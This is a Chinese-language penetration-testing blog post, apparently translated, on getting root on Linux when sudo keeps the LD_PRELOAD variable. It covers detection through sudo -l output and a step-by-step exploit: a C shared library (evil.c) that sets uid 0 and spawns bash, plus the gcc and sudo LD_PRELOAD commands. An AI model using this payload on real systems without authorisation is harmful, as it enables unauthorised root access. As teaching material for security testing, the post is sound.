---
title: "Sudo (LD_PRELOAD) (Linux Privilege Escalation)"
date: 2018-08-25
author: "Mars Cheng"
summary: "Liunx權限提升-LD_PRELOAD環境變量"
translationKey: "sudo-ld-preload-linux-privilege-escalation"
slug: "sudo-ld-preload-linux-privilege-escalation"
aliases:
  - /blog/2018/sudo-ld-preload-linux-privilege-escalation/
  - /2018/sudo-ld-preload-linux-privilege-escalation/
tags:
  - "Penetration Testing"
  - "Security Technique"
  - "Linux System"
  - "Translating Articles"
---

## Overview

> This is Translating Articles which from <http://touhidshaikh.com/blog/?p=827>, if any problem,  If any mistake or suggestion, please let we konw. Thanks.
> 本篇文章翻譯自 <http://touhidshaikh.com/blog/?p=827>，如有任何問題敬請不吝指教。


> 本文針對LD_PRELOAD的環境變量進行權限提升。在進行漏洞利用之前，我們來讀一些有關LD_PRELOAD的內容。

## Index

1. 什麼是LD_PRELOAD?
2. 偵測
3. LD_PRELOAD漏洞利用
   
---
### 1. 什麼是LD_PRELOAD?

LD_PRELOAD是一個可選擇性的環境變量，包含一個或多個共享函式庫或共享對象的路徑，載入器會在比C runtime函式庫（libc.so）在內的其他共享函式庫預先載入。

為了避免這種機制被用做suid/sgid的攻擊向量。如果ruid!=euid，載入程序會忽略LD_PRELOAD，對於此類功能，只會預先載入也是suid/sgid的函式庫

---
### 2. 偵測

```
user@debian:~$ sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```
![](https://i.imgur.com/8BhGJqI.png)

如果終端機的輸出結果如上，代表目標是易遭受攻擊的。可以藉由利用LD_PRELOAD來獲得root權限。而對於這一權限提升方式，需要一些使用LD_PRELOAD envr的sudo權限指令。

程式檔案：
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

---
### 3. LD_PRELOAD漏洞利用

開啟終端並轉到任何可寫入的目錄已刪除shell
可寫入的目錄像是：
* /tmp
* /var/tmp
* /dev/shm

本文以/tmp目錄作為示範
**步驟1**
```
user@debian:/tmp$ cat << EOF >> evil.c
> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h>
> void _init() {
> unsetenv("LD_PRELOAD");
> setgid(0);
> setuid(0);
> system("/bin/bash");
> }
> EOF
```
**步驟2**
編譯目標檔案
```
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
```

**步驟3**
```
sudo LD_PRELOAD=evil.so <COMMAND>
```
<COMMAND>代表允許使用sudo執行哪個指令，可以使用當前使用者允許使用的指令
![](https://i.imgur.com/5WS1l6t.png)

![](https://i.imgur.com/5SUQcMC.png)

![](https://i.imgur.com/GnJ4o9Z.png)




### Reference

[1] <http://touhidshaikh.com/blog/?p=827>
